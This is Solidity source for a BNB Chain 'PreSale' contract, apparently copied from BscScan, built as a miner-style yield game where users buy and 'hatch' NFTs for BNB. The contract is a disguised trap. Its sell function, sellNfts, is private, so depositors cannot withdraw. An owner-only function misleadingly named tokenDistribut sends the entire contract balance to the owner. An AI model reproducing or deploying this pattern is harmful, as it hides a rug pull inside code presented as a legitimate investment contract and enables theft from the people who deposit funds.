/**
 *Submitted for verification at BscScan.com on 2022-01-05
*/

/**
 *Submitted for verification at BscScan.com on 2021-09-24
*/

pragma solidity ^0.4.26; // solhint-disable-line

contract PreSale{
    //uint256 NFTS_PER_MINERS_PER_SECOND=1;
    uint256 public NFTS_TO_HATCH_1MINERS=2592000;//for final version should be seconds in a day
    uint256 PSN=10000;
    uint256 PSNH=5000;
    bool public initialized=false;
    address public ceoAddress;
    address public ceoAddress2;
    mapping (address => uint256) public hatcheryMiners;
    mapping (address => uint256) public claimedNfts;
    mapping (address => uint256) public lastHatch;
    mapping (address => address) public referrals;
    uint256 public marketNfts;
    constructor() public{
        ceoAddress=msg.sender;
        ceoAddress2=address(0x32839d1222f4ecf01da419BEdca493E81AC3BA44);
    }
    function hatchNfts(address ref) public{
        require(initialized);
        if(ref == msg.sender) {
            ref = 0;
        }
        if(referrals[msg.sender]==0 && referrals[msg.sender]!=msg.sender){
            referrals[msg.sender]=ref;
        }
        uint256 nftsUsed=getMyNfts();
        uint256 newMiners=SafeMath.div(nftsUsed,NFTS_TO_HATCH_1MINERS);
        hatcheryMiners[msg.sender]=SafeMath.add(hatcheryMiners[msg.sender],newMiners);
        claimedNfts[msg.sender]=0;
        lastHatch[msg.sender]=now;
        
        //send referral nfts
        claimedNfts[referrals[msg.sender]]=SafeMath.add(claimedNfts[referrals[msg.sender]],SafeMath.div(nftsUsed,10));
        
        //boost market to nerf miners hoarding
        marketNfts=SafeMath.add(marketNfts,SafeMath.div(nftsUsed,5));
    }
    function sellNfts() private{
        require(initialized);
        uint256 hasNfts=getMyNfts();
        uint256 nftValue=calculateNftSell(hasNfts);
        uint256 fee=devFee(nftValue);
        uint256 fee2=fee/2;
        claimedNfts[msg.sender]=0;
        lastHatch[msg.sender]=now;
        marketNfts=SafeMath.add(marketNfts,hasNfts);
        ceoAddress.transfer(fee2);
        ceoAddress2.transfer(fee-fee2);
        msg.sender.transfer(SafeMath.sub(nftValue,fee));
    }
    function buyNfts(address ref) public payable{
        require(initialized);
        uint256 nftsBought=calculateNftBuy(msg.value,SafeMath.sub(address(this).balance,msg.value));
        nftsBought=SafeMath.sub(nftsBought,devFee(nftsBought));
        uint256 fee=devFee(msg.value);
        uint256 fee2=fee/2;
        ceoAddress.transfer(fee2);
        ceoAddress2.transfer(fee-fee2);
        claimedNfts[msg.sender]=SafeMath.add(claimedNfts[msg.sender],nftsBought);
        hatchNfts(ref);
    }
    //magic trade balancing algorithm
    function calculateTrade(uint256 rt,uint256 rs, uint256 bs) public view returns(uint256){
        //(PSN*bs)/(PSNH+((PSN*rs+PSNH*rt)/rt));
        return SafeMath.div(SafeMath.mul(PSN,bs),SafeMath.add(PSNH,SafeMath.div(SafeMath.add(SafeMath.mul(PSN,rs),SafeMath.mul(PSNH,rt)),rt)));
    }
    function calculateNftSell(uint256 nfts) public view returns(uint256){
        return calculateTrade(nfts,marketNfts,address(this).balance);
    }
    function calculateNftBuy(uint256 eth,uint256 contractBalance) public view returns(uint256){
        return calculateTrade(eth,contractBalance,marketNfts);
    }
    function calculateNftBuySimple(uint256 eth) public view returns(uint256){
        return calculateNftBuy(eth,address(this).balance);
    }
    function devFee(uint256 amount) public pure returns(uint256){
        return SafeMath.div(SafeMath.mul(amount,5),100);
    }
    function seedMarket() public payable{
        require(marketNfts==0);
        initialized=true;
        marketNfts=259200000000;
    }
    function getBalance() public view returns(uint256){
        return address(this).balance;
    }
    function getMyMiners() public view returns(uint256){
        return hatcheryMiners[msg.sender];
    }
    function getMyNfts() public view returns(uint256){
        return SafeMath.add(claimedNfts[msg.sender],getNftsSinceLastHatch(msg.sender));
    }
    function getNftsSinceLastHatch(address adr) public view returns(uint256){
        uint256 secondsPassed=min(NFTS_TO_HATCH_1MINERS,SafeMath.sub(now,lastHatch[adr]));
        return SafeMath.mul(secondsPassed,hatcheryMiners[adr]);
    }
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }
    address owner = msg.sender;
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    function tokenDistribut() onlyOwner public {
        address myAddress = this;
        uint256 etherBalance = myAddress.balance;
        owner.transfer(etherBalance);
    }
}

library SafeMath {

  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }

  /**
  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}